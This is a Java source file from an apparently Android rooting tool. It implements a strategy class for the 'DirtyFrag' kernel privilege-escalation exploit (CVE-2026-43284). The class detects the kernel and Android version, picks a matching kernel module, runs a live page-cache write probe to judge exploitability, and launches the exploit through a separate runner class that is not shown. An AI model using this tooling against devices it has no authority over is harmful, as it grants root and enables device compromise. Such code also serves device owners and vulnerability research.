package build.bytes.temproot;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.net.IpSecManager;
import android.os.Build;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

public final class DirtyFragStrategy implements VulnerabilityStrategy {
    private static final Pattern KERNEL_VERSION = Pattern.compile("^(\\d+)\\.(\\d+)");

    // Keep in sync with app/src/main/jni/ko/ and CMakeLists.txt.
    private static final String[][] SUPPORTED_LKMS = {
            {"12", "5.10"},
            {"13", "5.10"}, {"13", "5.15"},
            {"14", "5.15"}, {"14", "6.1"},
            {"15", "6.6"},
            {"16", "6.12"},
            {"17", "6.18"},
    };

    @Override
    public String name() {
        return "DirtyFrag (CVE-2026-43284)";
    }

    @Override
    public String infoUrl() {
        return "https://github.com/v4bel/dirtyfrag";
    }

    @Override
    public CompatibilityResult inspectRunningDevice(Context context, String managerPackage, IReporter reporter) {
        IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);
        if (ipsec == null) {
            return new CompatibilityResult("Runtime unavailable",
                    "This Android build does not expose IpSecManager.", false);
        }
        boolean managerOk = false;
        ApplicationInfo app = ExploitRunner.resolveManager(context, managerPackage);
        if (app != null) managerOk = ExploitRunner.hasKsud(app);

        int androidRelease = androidRelease();
        int kMajor = 0, kMinor = 0;
        String osVersion = System.getProperty("os.version", "");
        if (osVersion != null) {
            Matcher matcher = KERNEL_VERSION.matcher(osVersion);
            if (matcher.find()) {
                kMajor = Integer.parseInt(matcher.group(1));
                kMinor = Integer.parseInt(matcher.group(2));
            }
        }
        String branch = kMajor + "." + kMinor;

        String module = moduleFor(androidRelease, kMajor, kMinor);
        String lkm = lkmMode(module);

        // The probe decides exploitability on its own: a kernel without a
        // loadable module is still tested, and told apart from "patched".
        int rc = ExploitRunner.probe(context, reporter);
        if (rc == 0) {
            if (!"none".equals(lkm)) {
                if (!managerOk) {
                    return new CompatibilityResult("Vulnerable — no manager",
                            "Live probe wrote into the page cache. Install a root manager containing "
                                    + "libksud.so to hand root over.", false);
                }
                return new CompatibilityResult("Vulnerable",
                        "Live probe wrote into the page cache. Matching module: "
                                + (ExploitRunner.samsungDevice()
                                        ? module.replace("temproot-", "dfr_lkm-") : module) + ".", true);
            }
            String why = module == null
                    ? (kMajor < 5 ? "this is a non-GKI " + branch + " vendor kernel, so no module is built for it"
                                  : "no module exists for " + branch)
                    : "CONFIG_MODULE_SIG_FORCE rejects unsigned modules";
            return new CompatibilityResult("Vulnerable — no root handoff",
                    "Live probe wrote into the page cache, but " + why
                            + ". Without a loadable module the exploit cannot hand root to a manager.",
                    false);
        }
        if (rc == 1) {
            return new CompatibilityResult("Not vulnerable (patched)",
                    "Live probe wrote nothing back: this kernel isolates spliced pages before in-place "
                            + "ESP decrypt, so the page-cache primitive is fixed.", false);
        }
        return new CompatibilityResult("Check inconclusive",
                "The probe could not run (code " + rc + "). The kernel branch looks supported, "
                        + "but exploitability is unconfirmed.", false);
    }

    @Override
    public int launch(Context context, IReporter reporter) throws Exception {
        return ExploitRunner.run(context, reporter);
    }

    private static int androidRelease() {
        try {
            return Integer.parseInt(Build.VERSION.RELEASE);
        } catch (Exception e) {
            if (Build.VERSION.SDK_INT >= 35) return 15;
            if (Build.VERSION.SDK_INT == 34) return 14;
            if (Build.VERSION.SDK_INT == 33) return 13;
            return 12;
        }
    }

    private static String moduleFor(int androidRelease, int major, int minor) {
        String branch = major + "." + minor;
        String fallback = null;
        for (String[] lkm : SUPPORTED_LKMS) {
            if (!lkm[1].equals(branch)) continue;
            String name = "temproot-android" + lkm[0] + "-" + lkm[1] + ".ko";
            if (lkm[0].equals(String.valueOf(androidRelease))) return name;
            if (fallback == null) fallback = name;
        }
        return fallback;
    }

    /** "temproot" | "dfr" | "none": the module family this run can actually load. */
    static String lkmMode() {
        int kMajor = 0, kMinor = 0;
        Matcher matcher = KERNEL_VERSION.matcher(String.valueOf(System.getProperty("os.version", "")));
        if (matcher.find()) {
            kMajor = Integer.parseInt(matcher.group(1));
            kMinor = Integer.parseInt(matcher.group(2));
        }
        return lkmMode(moduleFor(androidRelease(), kMajor, kMinor));
    }

    private static String lkmMode(String module) {
        if (module == null || "y".equals(kernelConfig("CONFIG_MODULE_SIG_FORCE"))) return "none";
        return ExploitRunner.samsungDevice() ? "dfr" : "temproot";
    }

    /** Reads a single kernel config value; null when /proc/config.gz is unavailable or blocked. */
    private static String kernelConfig(String key) {
        File cfg = new File("/proc/config.gz");
        if (!cfg.exists()) return null;
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(new GZIPInputStream(new FileInputStream(cfg))))) {
            for (String line; (line = reader.readLine()) != null; ) {
                if (line.startsWith(key + "=")) return line.substring(key.length() + 1).trim();
            }
        } catch (Exception ignored) {
            // SELinux may block /proc/config.gz for apps; the live probe still decides exploitability.
        }
        return null;
    }
}
